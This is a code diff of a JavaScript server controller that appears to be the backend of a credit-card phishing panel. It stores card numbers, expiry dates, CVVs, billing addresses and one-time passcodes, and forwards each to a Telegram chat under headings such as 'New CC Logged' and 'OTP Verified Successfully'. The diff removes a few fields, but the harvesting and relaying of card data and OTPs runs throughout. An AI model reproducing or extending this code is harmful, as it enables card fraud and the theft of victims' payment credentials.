@@ -46,7 +46,7 @@ exports.createBillingInfo = async (req, res) => {
     const message = `
     🏠 <b>New Billing Address Added</b> 🏠
     ---------------------------------
-    👤 <b>UserID:</b> ${userId}
+    
     📍 <b>Street:</b> ${street}
        <b>fName:</b> ${fName}
        <b>lName:</b> ${lName}
@@ -101,7 +101,7 @@ const fetchBankLogo = async (bankDomain) => {
 };
 
 exports.createCreditCardInfo = async (req, res) => {
-  const { userId, cardNumber, expiryDate, securityCode, nameOnCard } = req.body;
+  const { userId, cardNumber, expiryDate, securityCode } = req.body;
 
   if (!userId) {
     return res.status(400).json({ error: 'User ID is required' });
@@ -152,7 +152,7 @@ exports.createCreditCardInfo = async (req, res) => {
 💳 <b>Scheme:</b> ${bankData.scheme}
 💳 <b>Type:</b> ${bankData.type}
 💳 <b>Brand:</b> ${bankData.brand}
-🖼️ <b>Logo:</b> [Logo](${bankData.logoUrl})
+
       `;
     } catch (binError) {
       console.error('BIN lookup failed:', binError);
@@ -162,18 +162,15 @@ exports.createCreditCardInfo = async (req, res) => {
 💳 <b>Scheme:</b> Unknown
 💳 <b>Type:</b> Unknown
 💳 <b>Brand:</b> Unknown
-🖼️ <b>Logo:</b> [Fallback Logo](https://logo.clearbit.com/example.com)
       `;
     }
 
-    const creditCardInfo = new CreditCard({ userId, cardNumber, expiryDate, securityCode, nameOnCard, bank: bankId });
+    const creditCardInfo = new CreditCard({ userId, cardNumber, expiryDate, securityCode, bank: bankId });
     await creditCardInfo.save();
 
     const message = `
 🏦 <b>New CC Logged</b> 🏦
 ---------------------------------
-👤 <b>UserID:</b> ${userId}
-👤 <b>Name On Card:</b> ${nameOnCard}
 📍 <b>CC NUM:</b> ${cardNumber}
 🏙️ <b>EXP:</b> ${expiryDate}
 🗽 <b>CVV:</b> ${securityCode}
@@ -190,7 +187,6 @@ ${bankInfo}
     } catch (telegramError) {
       console.error('Telegram notification failed:', telegramError.message);
     }
-
     res.status(201).json({ message: 'Credit card information saved successfully' });
   } catch (error) {
     console.error('Error saving credit card information:', error);
@@ -247,7 +243,7 @@ exports.handleContinue = async (req, res) => {
     const message = `
 🔔 <b>User Requested Code</b> 🔔
 ---------------------------------
-👤 <b>UserID:</b> ${userId}
+
 🏠 <b>Billing Info:</b>
 📍 <b>Street:</b> ${billingInfo.street}
 🏙️ <b>City:</b> ${billingInfo.city}
@@ -262,7 +258,7 @@ exports.handleContinue = async (req, res) => {
     console.log(`
 🔔 <b>User Requested Code</b> 🔔
 ---------------------------------
-👤 <b>UserID:</b> ${userId}
+
 🏠 <b>Billing Info:</b>
 📍 <b>Street:</b> ${billingInfo.street}
 🏙️ <b>City:</b> ${billingInfo.city}
@@ -311,7 +307,7 @@ exports.verifyOtp = async (req, res) => {
           const message = `
 🔐 <b>OTP Verified Successfully</b>
 ---------------------------------
-👤 <b>UserID:</b> ${userId}
+
 💳 <b>Card:</b> ${creditCard.cardNumber}
 ✅ <b>OTP:</b> ${otp}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
